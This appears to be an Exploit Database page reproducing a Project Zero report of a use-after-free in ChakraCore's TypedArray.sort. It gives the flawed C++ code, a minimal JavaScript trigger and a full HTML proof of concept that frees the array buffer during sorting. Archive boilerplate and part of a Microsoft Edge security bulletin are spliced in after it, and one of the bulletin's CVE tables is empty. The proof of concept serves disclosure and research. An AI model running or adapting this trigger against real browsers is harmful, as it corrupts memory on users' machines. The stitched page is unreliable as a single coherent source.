<!--
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=983

There is a use-after-free in TypedArray.sort. In TypedArrayCompareElementsHelper (https://chromium.googlesource.com/external/github.com/Microsoft/ChakraCore/+/TimeTravelDebugging/lib/Runtime/Library/TypedArray.cpp), the comparison function is called with the following code:

 Var retVal = CALL_FUNCTION(compFn, CallInfo(CallFlags_Value, 3),
                undefined,
                JavascriptNumber::ToVarWithCheck((double)x, scriptContext),
                JavascriptNumber::ToVarWithCheck((double)y, scriptContext));

            Assert(TypedArrayBase::Is(contextArray[0]));
            if (TypedArrayBase::IsDetachedTypedArray(contextArray[0]))
            {
                JavascriptError::ThrowTypeError(scriptContext, JSERR_DetachedTypedArray, _u("[TypedArray].prototype.sort"));
            }

            if (TaggedInt::Is(retVal))
            {
                return TaggedInt::ToInt32(retVal);
            }

            if (JavascriptNumber::Is_NoTaggedIntCheck(retVal))
            {
                dblResult = JavascriptNumber::GetValue(retVal);
            }
            else
            {
                dblResult = JavascriptConversion::ToNumber_Full(retVal, scriptContext);
            }

The TypeArray is checked to see if it has been detached, but then the return value from the function is converted to an integer, which can invoke valueOf. If this function detaches the TypedArray, one swap is perfomed on the buffer after it is freed.

A minimal PoC is as follows, and a full PoC is attached.

var buf = new ArrayBuffer( 0x10010);
var numbers = new Uint8Array(buf);

function v(){

   postMessage("test", "http://127.0.0.1", [buf])
   return 7;

}

function compareNumbers(a, b) {

  return {valueOf : v};
}

numbers.sort(compareNumbers);

This PoC works on 64-bit systems only.
-->

<html>
<body>
<script>

var buf = new ArrayBuffer( 0x10010);
var numbers = new Uint8Array(buf);
var first = 0;

function v(){
  alert("in v");
  if( first == 0){
	   postMessage("test", "http://127.0.0.1", [buf])
	first++;
	}
   return 7;

}

function compareNumbers(a, b) {
  alert("in func");

  return {valueOf : v};
}

try{
	numbers.sort(compareNumbers);
}catch(e){

	alert(e.message);

}
</script>
</body>
</html>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## In this article

## Cumulative Security Update for Microsoft Edge (3204062)

Published: December 13, 2016

**Version:** 1.0

## Executive Summary

This security update resolves vulnerabilities in Microsoft Edge. The most severe of the vulnerabilities could allow remote code execution if a user views a specially crafted webpage using Microsoft Edge. An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than users with administrative user rights.

This security update is rated Critical for Microsoft Edge on Windows 10 and Windows Server 2016. For more information, see the **Affected Software** section.

The update addresses the vulnerabilities by:

* Microsoft browser and affected components handle objects in memory
* Microsoft browser checks Same Origin Policy for scripts running inside Web Workers
* Scripting engines handle objects in memory

For more information about the vulnerabilities, see the **Vulnerability Information** section.

For more information about this update, see [Microsoft Knowledge Base Article 3204062](https://support.microsoft.com/kb/3204062).

## Affected Software

The following software versions or editions are affected. Versions or editions that are not listed are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

The severity ratings indicated for each affected software assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletinâs release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [December bulletin summary](https://technet.microsoft.com/library/security/ms16-dec).

**Note** Please see the [Security Update Guide](https://portal.msrc.microsoft.com/security-guidance) for a new approach to consuming the security update information. You can customize your views and create affected software spreadsheets, as well as download data via a restful API. For more information, please see the [Security Updates Guide FAQ](https://portal.msrc.microsoft.com/security-guidance). As a reminder, the Security Updates Guide will be replacing security bulletins as of February 2017. Please see our blog post, [Furthering our commitment to security updates](https://blogs.technet.microsoft.com/msrc/2016/11/08/furthering-our-commitment-to-security-updates/), for more details.

## Vulnerability Information

## Multiple Microsoft Browser Memory Corruption Vulnerabilities

Multiple remote code execution vulnerabilities exist when affected Microsoft browsers improperly access objects in memory. The vulnerabilities could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, the attacker could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

An attacker could host a specially crafted website that is designed to exploit the vulnerabilities through affected Microsoft browsers, and then convince a user to view the website. The attacker could also take advantage of compromised websites, or websites that accept or host user-provided content or advertisements, by adding specially crafted content that could exploit the vulnerabilities. In all cases, however, an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by an enticement in an email or Instant Messenger message, or by getting them to open an attachment sent through email.

The update addresses the vulnerabilities by modifying how Microsoft browsers handles objects in memory.

The following table contains a link to the standard entry for the vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Microsoft Edge Memory Corruption Vulnerability | [CVE-2016-7181](https://www.cve.org/CVERecord?id=CVE-2016-7181) | No | No |
| Microsoft Browser Memory Corruption Vulnerability | [CVE-2016-7279](https://www.cve.org/CVERecord?id=CVE-2016-7279) | No | No |

## Multiple Microsoft Browser Information Disclosure Vulnerabilities

Information disclosure vulnerabilities exist when Microsoft Browsers do not properly validate content under specific conditions. An attacker who exploited these vulnerabilities could run arbitrary code that could lead to an information disclosure.

In a web-based attack scenario, an attacker could host a website in an attempt to exploit these vulnerabilities. In addition, compromised websites and websites that accept or host user-provided content could contain specially crafted content that could exploit these vulnerabilities. However, in all cases an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action. For example, an attacker could trick users into clicking a link that takes the user to the attacker's site.

The security update addresses the vulnerabilities by correcting how Microsoft Browsers validate content.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |

## Multiple Scripting Engine Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist in the way affected Microsoft scripting engines render when handling objects in memory in Microsoft browsers. The vulnerabilities could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited these vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerability could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit these vulnerabilities through a Microsoft browser and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the Edge rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit these vulnerabilities.

The security update addresses these vulnerabilities by modifying how the affected Microsoft scripting engines handle objects in memory.
